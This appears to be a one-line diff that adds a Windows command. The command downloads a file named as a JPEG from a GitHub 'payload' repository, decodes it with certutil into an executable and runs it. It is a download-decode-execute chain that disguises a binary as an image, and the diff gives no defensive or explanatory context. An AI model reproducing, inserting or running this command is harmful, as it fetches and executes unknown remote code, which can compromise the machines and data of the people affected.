@@ -1,0 +1,1 @@
+powershell Invoke-WebRequest https://raw.githubusercontent.com/halitAKAYDIN/payload/main/file.jpg -O file.jpg & certutil -decode file.jpg file.exe & cmd.exe /c file.exe
